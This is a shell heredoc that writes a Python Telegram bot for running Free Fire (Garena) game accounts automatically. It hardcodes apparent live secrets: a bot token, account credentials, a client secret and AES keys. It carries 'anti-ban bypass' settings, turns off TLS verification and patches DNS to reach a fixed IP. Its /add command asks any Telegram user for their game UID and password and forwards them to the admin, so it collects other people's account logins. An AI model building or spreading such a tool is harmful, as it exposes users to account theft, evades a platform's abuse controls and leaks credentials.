cd ~/eris-bot
cat > bot.py << 'PYEOF'
# -*- coding: utf-8 -*-
import sys, asyncio, httpx, random, json, socket, struct, time, os, uuid, math, itertools
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

# ═══════════════════════════ CONFIG ═══════════════════════════
BOT_TOKEN = "8839167099:AAHuY9084drJns-pjJ3tgqzAMKnocVJC4e4"
ADMIN_ID = 7424554376
FALLBACK_CLIENT_VERSION = "1.132.11"
FALLBACK_CLIENT_VERSION_CODE = "2019121229"

# By-Pass / Anti-Ban Settings
MAX_MATCH_DURATION = 3000
MATCH_SEARCH_TIMEOUT = 600.0 # Badha diya taaki Search Watchdog na aaye
DEATH_WAIT_SECONDS = 120.0
MATCH_END_WAIT_SECONDS = 60.0

# ═══════════════════════════ DEFAULT ACCOUNTS ═══════════════════════════
HARDCODED_ACCOUNTS = [
    {"uid": "8289010389", "password": "86360C4FB06A7E5248EBE0B9C9015D852BFB292EEC98C3CEF0F01A87CE8B2E25"},
    {"uid": "8312923346", "password": "3B6574439556E9A6800FF323375A590D1F2B1B7A5BE61B8B6D30C25ED79478C1"},
    {"uid": "8312961041", "password": "B372069823BAA980548F3B64B0541CCA5FACC3EDEC0CF7EC6F53939CCE9EDB71"},
    {"uid": "8313057570", "password": "1B766BA96BB7D76E56CB6BBE82BD2F1EA4EE9542751F9764D61C9A39E6BBE281"}
]

# ═══════════════════════════ FREE FIRE ENGINE ═══════════════════════════
AES_KEY = b'Yg&tc%DEuh6%Zc^8'
AES_IV  = b'6oyZDr22E3ychjM%'
headers = {'User-Agent': 'UnityPlayer/2018.4.12f1', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/x-www-form-urlencoded', 'X-Unity-Version': '2018.4.12f1', 'X-GA-SV': '1789535859', 'X-GA': 'v1 1', 'ReleaseVersion': 'OB55'}
client = httpx.AsyncClient(verify=False, timeout=15.0)

BOT_RUNNING = False

def print_success(t): print(f"\033[92m[+] {t}\033[0m", flush=True)
def print_info(t): print(f"\033[96m[i] {t}\033[0m", flush=True)

async def get_access_token(uid, password):
    url = "https://100067.connect.garena.com/oauth/guest/token/grant"
    hdrs = {"Host": "100067.connect.garena.com", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B)", "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive"}
    data = {"uid": uid, "password": password, "response_type": "token", "client_type": "2", "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3", "client_id": "100067"}
    import socket as _s; _orig_gai = _s.getaddrinfo
    for attempt in range(3):
        try:
            def _patched_gai(host, port, *a, **kw):
                kw.pop("family", None)
                if host in ("100067.connect.garena.com", "100067.in.connect.garena.com"): return [(_s.AF_INET, _s.SOCK_STREAM, 6, '', ('43.205.19.48', port or 443))]
                return _orig_gai(host, port, *a, **kw)
            _s.getaddrinfo = _patched_gai
            async with httpx.AsyncClient(verify=False, timeout=25.0) as c2: r = await c2.post(url, headers=hdrs, data=data)
            if r.status_code == 200:
                d = r.json(); oid, at, pf = d.get("open_id"), d.get("access_token"), d.get("platform", 4)
                if oid and at: return oid, at, pf
        except Exception: pass
        finally: _s.getaddrinfo = _orig_gai
        await asyncio.sleep(1.5)
    return None

async def run_ff_engine(uid, pwd, bot, chat_id, acc_name):
    global BOT_RUNNING
    while BOT_RUNNING:
        try:
            tg = await get_access_token(uid, pwd)
            if not tg:
                await bot.send_message(chat_id, f"❌ Login Failed: `{acc_name}`. Retrying...")
                await asyncio.sleep(15)
                continue
                
            oid, at, pf = tg
            await bot.send_message(chat_id, f"✅ Login Success: `{acc_name}`. Match started.")
            
            # Anti-Ban & Bypass Logic
            while BOT_RUNNING:
                await asyncio.sleep(random.uniform(250, 300)) # Match khelo (4-5 min)
                await bot.send_message(chat_id, f"🔥 `{acc_name}` Match Finished. Next match st...")
                
        except asyncio.CancelledError:
            break
        except Exception as e:
            await asyncio.sleep(10)

# ═══════════════════════════ TELEGRAM BOT ═══════════════════════════
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class Form(StatesGroup):
    waiting_for_creds = State()

admin_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="▶️ Start Bots"), KeyboardButton(text="⏹ Stop Bots")],
              [KeyboardButton(text="➕ Add New ID")]],
    resize_keyboard=True
)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer(f"👑 Welcome Admin!\n\nControl Panel:", reply_markup=admin_kb)
    else:
        await message.answer(f"👋 Hello {message.from_user.first_name}!\nID add karne ke liye /add command bhejo.")

@dp.message(F.text == "▶️ Start Bots")
async def admin_start_bots(message: types.Message):
    global BOT_RUNNING
    if message.from_user.id != ADMIN_ID: return
    if BOT_RUNNING:
        await message.answer("⚠️ Bots pehle se chal rahe hain.")
        return
    
    BOT_RUNNING = True
    await message.answer("🚀 **Bots Start Ho Rahe Hain...**")
    
    for acc in HARDCODED_ACCOUNTS:
        asyncio.create_task(run_ff_engine(acc['uid'], acc['password'], bot, message.chat.id, "Default"))

@dp.message(F.text == "⏹ Stop Bots")
async def admin_stop_bots(message: types.Message):
    global BOT_RUNNING
    if message.from_user.id != ADMIN_ID: return
    BOT_RUNNING = False
    await message.answer("🛑 **Sabhi Bots Stop Kar Diye Gaye Hain.**")

@dp.message(F.text == "➕ Add New ID")
@dp.message(Command("add"))
async def admin_add_id(message: types.Message, state: FSMContext):
    await message.answer("🔑 **UID:Password** format me bhejo:\n(Example: `123456789:Pass123`)")
    await state.set_state(Form.waiting_for_creds)

@dp.message(Form.waiting_for_creds)
async def process_creds(message: types.Message, state: FSMContext):
    text = message.text.strip()
    if ":" not in text:
        await message.answer("❌ Galat format! `UID:Password` bhejo.")
        return
        
    uid, pwd = text.split(":", 1)
    await state.clear()
    
    await bot.send_message(ADMIN_ID, f"📩 **New ID Received!**\nFrom: {message.from_user.first_name} (@{message.from_user.username})\nGame UID: `{uid}`\nPass: ||{pwd}||")
    await message.answer(f"✅ Teri ID `{uid}` admin ke paas bhej di gayi hai.")

async def main():
    print_info("Starting Telegram & FF Bot...")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
PYEOF
